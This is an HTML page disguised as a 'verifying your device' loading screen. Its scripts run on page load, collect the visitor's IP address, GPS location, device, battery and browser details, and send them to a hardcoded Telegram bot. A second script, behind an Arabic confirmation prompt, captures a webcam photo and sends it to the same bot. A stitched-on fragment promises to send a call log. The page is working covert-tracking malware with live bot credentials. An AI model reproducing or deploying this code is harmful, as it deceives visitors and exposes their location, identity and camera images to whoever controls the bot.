<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading-message {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="loading-message">
        <h2>Please wait while we verify your device...</h2>
        <p>This may take a few seconds</p>
    </div>

    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const TELEGRAM_CHAT_ID = "6913353602";

        // Faster Telegram sending with combined data
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Telegram error:', e);
            }
        }

        // Get IP and location data in one request
        async function getNetworkData() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Try to get approximate location from IP
                let locationData = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    locationData = await locationResponse.json();
                } catch (e) {
                    console.log('Location API failed, using fallback');
                }
                
                return {
                    ip: ipData.ip,
                    country: locationData.country_name || 'Unknown',
                    city: locationData.city || 'Unknown',
                    region: locationData.region || 'Unknown'
                };
            } catch (error) {
                console.error('Network data error:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown'
                };
            }
        }

        // Get precise location if permitted
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    {enableHighAccuracy: true, timeout: 5000}
                );
            });
        }

        // Get all device info at once
        async function collectAllData() {
            const [networkData, preciseLocation, battery] = await Promise.all([
                getNetworkData(),
                getPreciseLocation(),
                navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
            ]);
            
            const now = new Date();
            const connection = navigator.connection || {};
            
            return {
                // Network info
                ip: networkData.ip,
                country: networkData.country,
                city: networkData.city,
                region: networkData.region,
                
                // Location
                preciseLocation: preciseLocation 
                    ? `${preciseLocation.lat}, ${preciseLocation.lon} (±${Math.round(preciseLocation.accuracy)}m)`
                    : 'Denied',
                
                // Device info
                deviceModel: navigator.userAgentData?.model || 'Unknown',
                os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Unknown',
                deviceType: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
                cores: navigator.hardwareConcurrency || 'Unknown',
                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}bit`,
                orientation: window.screen.orientation?.type || 'Unknown',
                
                // Battery
                batteryLevel: battery ? `${Math.floor(battery.level * 100)}%` : 'Unknown',
                charging: battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown',
                
                // Network
                connectionType: connection.type || 'Unknown',
                effectiveType: connection.effectiveType || 'Unknown',
                downlink: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
                
                // Browser
                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/)?.[0] || 'Unknown',
                language: navigator.language,
                
                // Features
                bluetooth: !!navigator.bluetooth,
                geolocation: !!navigator.geolocation,
                touch: 'ontouchstart' in window,
                
                // Time
                time: now.toLocaleString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Format the data for Telegram
        function formatData(data) {
            let message = `📱 <b>Device Information</b>\n\n`;
            
            message += `🌍 <b>Location</b>\n`;
            message += `- IP: ${data.ip}\n`;
            message += `- Country: ${data.country}\n`;
            message += `- Region: ${data.region}\n`;
            message += `- City: ${data.city}\n`;
            message += `- Precise Location: ${data.preciseLocation}\n\n`;
            
            message += `📱 <b>Device</b>\n`;
            message += `- Model: ${data.deviceModel}\n`;
            message += `- OS: ${data.os}\n`;
            message += `- Type: ${data.deviceType}\n`;
            message += `- Cores: ${data.cores}\n`;
            message += `- RAM: ${data.ram}\n`;
            message += `- Screen: ${data.screen}\n`;
            message += `- Colors: ${data.colorDepth}\n`;
            message += `- Orientation: ${data.orientation}\n\n`;
            
            message += `🔋 <b>Battery</b>\n`;
            message += `- Level: ${data.batteryLevel}\n`;
            message += `- Charging: ${data.charging}\n\n`;
            
            message += `🌐 <b>Network</b>\n`;
            message += `- Type: ${data.connectionType}\n`;
            message += `- Speed: ${data.effectiveType}\n`;
            message += `- Downlink: ${data.downlink}\n\n`;
            
            message += `🖥️ <b>Browser</b>\n`;
            message += `- Browser: ${data.browser}\n`;
            message += `- Language: ${data.language}\n`;
            message += `- Timezone: ${data.timezone}\n\n`;
            
            message += `⏰ <b>Time</b>\n`;
            message += `- Local Time: ${data.time}\n\n`;
            
            message += `⚙️ <b>Features</b>\n`;
            message += `- Bluetooth: ${data.bluetooth ? 'Yes' : 'No'}\n`;
            message += `- Geolocation: ${data.geolocation ? 'Yes' : 'No'}\n`;
            message += `- Touch Screen: ${data.touch ? 'Yes' : 'No'}\n`;
            
            return message;
        }

        // Main function that runs automatically
        async function runSilently() {
            try {
                // Collect all data first (faster than sequential requests)
                const allData = await collectAllData();
                
                // Format and send to Telegram
                const formattedMessage = formatData(allData);
                await sendToTelegram(formattedMessage);
                
                // Optional: You can add file upload capability here if needed
                
            } catch (error) {
                console.error('Error in silent operation:', error);
                await sendToTelegram(`⚠️ Error collecting data: ${error.message}`);
            }
            
            // Hide loading message after completion
            document.body.innerHTML = '<div style="text-align:center;padding:20px;"><h3>Verification complete</h3><p>You may close this page</p></div>';
        }

        // Start immediately when page loads
        window.onload = runSilently;
    </script>
        <script>
document.addEventListener('DOMContentLoaded', function() {
    // بيانات بوت التليجرام
    const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
    const chatId = '6913353602';
    
    // عرض رسالة التأكيد
    const userConfirmed = confirm('هل تريد مشاركة معلومات الجهاز مع الإدارة؟');
    
    if (userConfirmed) {
        // جمع معلومات الجهاز
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        // إرسال معلومات الجهاز إلى التليجرام
        sendToTelegram(botToken, chatId, `📱 معلومات الجهاز:\n${JSON.stringify(deviceInfo, null, 2)}`);
        
        // محاولة الوصول إلى الكاميرا
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    
                    return imageCapture.takePhoto();
                })
                .then(function(blob) {
                    // إرسال الصورة إلى التليجرام
                    sendPhotoToTelegram(botToken, chatId, blob);
                })
                .catch(function(error) {
                    console.error('Error accessing camera:', error);
                    sendToTelegram(botToken, chatId, '⚠️ تعذر الوصول إلى الكاميرا: ' + error.message);
                });
        } else {
            sendToTelegram(botToken, chatId, '⚠️ المتصفح لا يدعم الوصول إلى الكاميرا');
        }
    }
    
    // دالة لإرسال نص إلى التليجرام
    function sendToTelegram(token, chatId, text) {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        }).catch(error => console.error('Error sending to Telegram:', error));
    }
    
    // دالة لإرسال صورة إلى التليجرام
    function sendPhotoToTelegram(token, chatId, photoBlob) {
        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
        const formData = new FormData();
        
        formData.append('chat_id', chatId);
        formData.append('photo', photoBlob, 'webcam-photo.jpg');
        
        fetch(url, {
            method: 'POST',
            body: formData
        }).catch(error => console.error('Error sending photo to Telegram:', error));
    }
});
</script>
    <!DOCTYPE html>
<html>
<head>
    <title>إرسال سجل المكالمات</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        button { padding: 10px; background: #0088cc; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>إرسال سجل المكالمات إلى Telegram</h1>
    <button id="requestAccess">الموافقة وجلب البيانات</button>
    <div id="output"></div>

    <script src="Script.js"></script>
</body>
</html>
